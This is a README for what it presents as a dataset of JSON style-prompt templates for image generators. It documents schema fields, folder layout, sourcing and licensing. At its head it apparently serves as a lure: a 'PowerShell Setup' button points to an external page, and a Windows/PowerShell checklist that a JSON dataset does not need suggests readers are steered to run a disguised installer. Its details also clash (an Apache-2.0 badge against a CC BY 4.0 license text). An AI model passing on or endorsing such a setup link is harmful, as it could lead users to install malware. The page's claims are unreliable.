<div align="center">

# AI Visual Prompt Cookbook: Structured Style Prompt Collection — Dataset

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://SenpaiSpide664.github.io/ai-visual-prompt-cookbook/)

[![channel](https://img.shields.io/badge/CHANNEL-STABLE-2ea44f?style=flat&labelColor=0d1117)]() [![code](https://img.shields.io/badge/CODE-PYTHON-a855f7?style=flat&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-7%2B-9333ea?style=flat&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-APACHE--2.0-7c3aed?style=flat&labelColor=0d1117)]()

</div>

---

The AI Visual Prompt Cookbook is a structured dataset of reusable style definitions for AI image generation, distributed as self-contained JSON prompt templates compatible with Nano Banana Pro, GPT Image, and Midjourney. Each entry pairs a parameterized `style.json` file with preview assets and documented variables, allowing a single style definition to be applied consistently across different subjects and compositions. The dataset is openly accessible and updated on a weekly cadence with new style entries. This README documents the dataset's structure, schema conventions, and intended use for researchers and practitioners working with prompt-based image synthesis.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Dataset Structure

The dataset is organized as a flat directory of self-contained style packages, one directory per visual style. Each package is addressed by a stable slug and holds a single machine-readable prompt specification alongside two fixed preview renders, so any style can be located, copied, and reproduced independently of the others.

```
styles/<style-slug>/
style.json # Machine-readable prompt specification
preview-16x9.jpg # Landscape reference render
preview-9x16.jpg # Portrait reference render
```

The `style.json` file is the primary artifact and is fully self-contained: it can be transferred in isolation into any compatible multimodal workflow without auxiliary files. Its structure is defined as follows:

- `prompt_template` — the reusable style prompt, expressed with `{VARIABLE}` placeholders for all substitutable content.
- `environment_variables` — a declaration of every placeholder the template accepts, including expected value types where applicable.
- `schema_version` — records the specification revision. Newer entries declare `"2.2"` and enumerate only the variables their template actually consumes (for example `SUBJECT`, `MAIN_TEXT`, `DESIGN_DIRECTION`); earlier `"2.1"` entries retain a fixed set of ten standard variables.
- `examples` — an array of ready-to-edit cases; each case stores only `case_name` and its corresponding `values` map.
- `style_fidelity_anchors` — the invariants the model is instructed to preserve across generations.
- `source_content_to_avoid` — explicit exclusions that prevent direct reproduction of reference material.
- `negative_prompt` — suppression directives for watermarks, logos, and off-style outputs.

Rendered prompt strings (such as per-aspect-ratio or fully expanded variants) are deliberately not persisted. They are derived at generation time from `prompt_template` combined with a selected `values` set, which keeps each file compact and prevents divergence between stored and generated content.

The two preview images are fixed at 16:9 and 9:16 and serve as visual ground truth for the corresponding style; they are named consistently across all packages to permit uniform iteration and comparison. Style slugs are unique, lower-case, and hyphen-delimited, and the directory name, slug, and internal identifiers correspond one-to-one. The collection is extended on a weekly cadence, with new packages added under the same structure and revision rules; existing packages are not silently renumbered, and any change to a template's variable contract is reflected in its `schema_version`.

## Columns

Each style entry is stored as a single `style.json` document (schema versions 2.1 and 2.2) whose fields are declared below. Field names are stable across the library, and every rendered prompt is derived at generation time rather than stored, so the column set describes the machine-readable source of record rather than any output artifact.

| Column | Type | Description |
| - | - | - |
| `style_name` | string | Human-readable name of the visual system, matching the folder slug and catalog entry. |
| `schema_version` | string | Declares the field contract in force for the file; `"2.2"` files declare only the variables their template consumes, while `"2.1"` files retain the ten standard variables. |
| `category` | string | Coarse grouping used by the catalog and gallery navigation (for example photo-and-doodle, zine-and-collage, type-poster, travel-and-city, editorial-and-minimal, product-and-campaign). |
| `description` | string | Prose summary of the visual system, stating palette, composition logic, and the intended output class. |
| `prompt_template` | string | The reusable style prompt containing `{VARIABLE}` placeholders; the only field from which final prompts are assembled. |
| `environment_variables` | array of objects | Declares every placeholder the template may reference, each with its name, expected value form, and short guidance. |
| `examples` | array of objects | Ready-to-edit cases; each case stores only `case_name` and a `values` map, never a rendered prompt. |
| `style_fidelity_anchors` | string | Explicit statement of the visual invariants the model should preserve across generations. |
| `source_content_to_avoid` | string | Enumeration of source-specific content that must not be reproduced, guarding against direct recreation of reference material. |
| `negative_prompt` | string | Exclusions applied at generation time, covering watermarks, logos, direct source recreations, and off-style output. |
| `aspect_ratios` | array of strings | Supported output ratios, conventionally `16:9` and `9:16`, with any ratio-conditional layout rules carried inside the template. |

Two derived columns are intentionally absent from the stored files. Rendered prompts (`prompt_16x9`, `prompt_9x16`, `full_prompt`) are computed from `prompt_template` plus a chosen `examples[*].values` entry, which keeps each document compact and prevents rendered text from drifting out of sync with its template. Preview images (`preview-16x9.jpg`, `preview-9x16.jpg`) sit alongside `style.json` in each style folder as sibling assets rather than as fields, so the JSON remains the sole authoritative record.

Values supplied through `environment_variables` are treated as user input and are not persisted in the library; the repository stores only the declaration and the illustrative cases. Where a template branches on aspect ratio, the conditional logic is expressed inside `prompt_template` rather than as a separate column, so consumers need only read one field to reconstruct the full instruction set.

## Source

The style templates in this collection were assembled by the maintainers of AI Visual Prompt Cookbook from close visual analysis of editorial design, poster art, animation key visuals, packaging, and campaign graphics. Each `style.json` is an original written specification: rather than reproducing any single image or designer's work, the template abstracts the recurring visual decisions — palette, composition logic, typographic behavior, texture, and lighting — into a parameterized prompt system that can be applied to new subjects. Selected styles are revised and expanded on a weekly cadence as new references are studied and new cases are authored.

Two sourcing principles govern the library. First, provenance is documented at the level of genre and reference class rather than individual works; the `style_fidelity_anchors` field records which visual properties define a style, while the `source_content_to_avoid` field records the specific subjects, faces, crops, and text strings observed in reference material so that generated outputs remain distinct from it. Second, all example values, character descriptions, headlines, and fictional titles shipped in `examples[*].values` are written by the maintainers for demonstration purposes and do not derive from any existing publication, film, brand, or campaign.

Variable values supplied by users are the user's own responsibility; the templates are model-agnostic and are intended to be composed with original subject matter. Style definitions, prompt scaffolding, and example cases are versioned together so that any change to a template can be traced to its corresponding examples, and validation is performed against the schema documented in the Dataset Structure and Columns sections. Corrections or attributions that the maintainers have overlooked are welcomed through the project's discussion channels and will be reflected in subsequent releases.

## License

This dataset is released under the Creative Commons Attribution 4.0 International license. Under its terms, you may share and adapt the material for any purpose, including commercial use, provided you give appropriate credit to the AI Visual Prompt Cookbook, indicate whether changes were made, and retain this notice. Attribution should name the project, reference the specific style or file used, and link back to the source repository where practical.

The library is offered on an as-is basis, without warranty of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, or non-infringement. In no event shall the authors or contributors be liable for any claim, damages, or other liability arising from the use of the dataset or the outputs generated with it. Users are responsible for verifying that their own use of any style, prompt template, or derived output complies with applicable law and with the terms of any image generation model they employ.

Each style.json record carries its own license field, and individual records may specify different terms than this collection-level notice; where they conflict, the per-record terms govern. If you incorporate a style into a derivative work, please preserve the license field and the attribution metadata intact so that downstream users can determine the applicable terms.

This license does not extend to third-party trademarks, likenesses, or copyrighted references that may appear in style descriptions or preview images. Such elements remain the property of their respective owners and are included only as descriptive context or stylistic reference. No endorsement by any rights holder is implied.

Contributions submitted to the project are accepted under the same license, and contributors affirm that they have the right to license the material they submit. Questions regarding licensing or permitted use may be directed to the project maintainers through the repository's issue tracker.

## Contact

Questions, corrections, and style submissions are coordinated through the AI Visual Prompt Cookbook project itself. For defects in a specific `style.json` — malformed JSON, undeclared placeholders, or template text that diverges from its accompanying previews — please open an issue in the project's issue tracker and reference the style slug and schema version so the report can be triaged against the validation script. Proposed new styles should follow the existing package shape and pass the repository validator before review; submissions that alter the shared template conventions will be assessed for backward compatibility with prior schema versions. General methodological questions about variable design, fidelity anchors, or the derivation of rendered prompts are best raised in the project's discussion space, where responses are kept visible for other users. We aim to acknowledge substantive reports within a reasonable interval, though response times vary with maintainer availability. All correspondence is expected to remain factual and reproducible: include the exact input values used, the observed output, and the expected behavior, so that each report can be independently verified.